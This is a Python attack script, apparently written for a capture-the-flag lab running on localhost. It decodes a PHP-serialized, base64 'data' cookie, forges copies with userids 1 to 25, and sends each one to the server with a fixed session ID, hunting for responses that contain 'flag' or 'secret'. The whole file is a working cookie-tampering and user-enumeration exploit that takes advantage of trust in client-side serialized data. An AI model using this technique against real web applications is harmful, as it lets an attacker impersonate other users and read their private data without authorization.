import requests
import base64
import urllib.parse
import re

# Target configuration
base_url = "http://127.0.0.1:32984"

# Original cookie value (for reference)
# TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjY7czo4OiJ1c2VybmFtZSI7czoxMzoiZGVhZGVuZHRlc3RlciI7fQ%3D%3D
# Decodes to: O:11:"UserProfile":2:{s:6:"userid";i:6;s:8:"username";s:13:"deadendtester";}

# Function to create serialized payload
def create_payload(userid, username="deadendtester"):
    # Create PHP serialized object with the userid we want to test
    payload = f'O:11:"UserProfile":2:{{s:6:"userid";i:{userid};s:8:"username";s:{len(username)}:"{username}";}}'
    # Base64 encode
    b64_encoded = base64.b64encode(payload.encode()).decode()
    # URL encode
    url_encoded = urllib.parse.quote(b64_encoded, safe='')
    return payload, b64_encoded, url_encoded

# First, let's decode and display the current cookie to verify structure
original_cookie = "TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjY7czo4OiJ1c2VybmFtZSI7czoxMzoiZGVhZGVuZHRlc3RlciI7fQ%3D%3D"
decoded_url = urllib.parse.unquote(original_cookie)
decoded_base64 = base64.b64decode(decoded_url).decode()
print(f"[+] Original cookie decoded to: {decoded_base64}")
print(f"[+] Current userid appears to be: 6")
print(f"[+] Current username: deadendtester")
print()

# Test our payload generation matches original
test_payload, test_b64, test_url = create_payload(6)
print(f"[+] Generated payload for userid=6: {test_payload}")
print(f"[+] Base64: {test_b64}")
print(f"[+] URL encoded: {test_url}")
print(f"[+] Match with original: {test_url == original_cookie}")
print()

# Store session to maintain PHPSESSID
session = requests.Session()

# Set up base cookies (we'll override 'data' for each test)
base_cookies = {
    'PHPSESSID': 'e0c7b3a13ef9a02dea7005839efb56bf'
}

# Keep track of responses to compare
responses = {}

print("[*] Starting enumeration of userid values...")
print("=" * 70)

# Test userid values from 1 to 25
for userid in range(1, 26):
    # Create payload
    raw, b64, url_encoded = create_payload(userid)
    
    # Set cookies
    cookies = base_cookies.copy()
    cookies['data'] = url_encoded
    
    try:
        # Send request
        response = session.get(base_url, cookies=cookies, timeout=10)
        
        # Store response info
        response_length = len(response.text)
        responses[userid] = {
            'length': response_length,
            'status': response.status_code,
            'content': response.text
        }
        
        # Check for interesting patterns
        has_secret = 'secret' in response.text.lower()
        has_flag = 'flag' in response.text.lower() or 'FLAG' in response.text
        
        # Look for note-related content
        note_match = re.search(r'[Nn]ote[:\s]*([^<\n]+)', response.text)
        note_content = note_match.group(1) if note_match else "No note found"
        
        # Look for username display
        user_match = re.search(r'[Uu]ser(?:name)?[:\s]*([^<\n]+)', response.text)
        username_display = user_match.group(1) if user_match else "No username found"
        
        # Check for any differences from user 6 (baseline)
        if userid == 6:
            print(f"\n[BASELINE] userid={userid} | Status: {response.status_code} | Length: {response_length}")
            print(f"  Note preview: {note_content[:100]}")
            baseline_length = response_length
        elif has_secret or has_flag or response_length != responses[6]['length']:
            print(f"\n[!] ANOMALY - userid={userid} | Status: {response.status_code} | Length: {response_length}")
            print(f"  Contains 'secret': {has_secret} | Contains 'flag': {has_flag}")
            print(f"  Note preview: {note_content[:150]}")
            print(f"  Username display: {username_display[:100]}")
            if has_flag:
                print(f"\n[!] FULL RESPONSE for userid={userid}:")
                print(response.text)
        else:
            print(f"[.] userid={userid} | Status: {response.status_code} | Length: {response_length} | Same as baseline")
            
    except Exception as e:
        print(f"[!] Error with userid={userid}: {str(e)}")

print("\n" + "=" * 70)
print("[*] Enumeration complete!")

# Summary of unique response lengths
print("\n[+] Response Length Summary:")
lengths = {}
for uid, data in responses.items():
    length = data['length']
    if length not in lengths:
        lengths[length] = []
    lengths[length].append(uid)

for length, userids in sorted(lengths.items()):
    print(f"  Length {length} bytes: userids {userids}")

# Find userids with different content than baseline
if 6 in responses:
    baseline_len = responses[6]['length']
    print(f"\n[+] Userids with different response from baseline (userid=6):")
    for userid in range(1, 26):
        if userid in responses and responses[userid]['length'] != baseline_len:
            print(f"  userid={userid}: Length={responses[userid]['length']}")

